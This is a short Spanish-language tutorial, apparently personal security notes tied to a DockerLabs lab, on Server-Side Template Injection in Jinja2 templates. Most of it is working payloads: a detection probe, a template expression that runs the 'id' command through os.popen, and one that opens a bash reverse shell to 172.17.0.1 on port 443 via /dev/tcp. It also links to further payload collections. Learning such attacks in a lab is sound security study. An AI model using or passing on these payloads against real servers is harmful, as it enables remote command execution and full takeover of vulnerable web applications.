<h1 align="center">SSTI attack</h1>

# EXPLICACIÓN

Un ataque de Server-Side Template Injection (STTI) es una técnica de explotación que aprovecha vulnerabilidades en aplicaciones web que utilizan plantillas del lado del servidor para renderizar contenido dinámico.

# EJEMPLO

Tenemos un formulario web que cuando enviamos la respuesta “hola” nos devuelve hola, “hola”.

![image](https://github.com/user-attachments/assets/c8c9f03d-bb6d-43c2-a6b0-5b7ceff95d11)

Podemos probar a ejecutar el siguiente comando para saber si es vulnerable a STTI:

- `{{7*7}}`

![image](https://github.com/user-attachments/assets/7113c07f-b95e-4f0e-896a-dee1fad308d6)

Como podemos ver el formulario nos ha devuelto la respuesta a esa multiplicación, lo quiere decir que podemos ejecutar comandos a través de ese campo del formulario web:

- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

![image](https://github.com/user-attachments/assets/32e8694c-e7b8-45bb-9dab-01f04999a9ce)

# REVERSE SHELL

Para conseguir una reverse shell ejecutaremos el siguiente comando:

- `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/443 0>&1\'').read() }}`

<https://github.com/TerrorAterrador/WriteUps/blob/main/DockerLabs/Verdejo.md>

Mas payloads que podemos utilizar para probar si el objetivo es vulnerable a STTI:

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection>
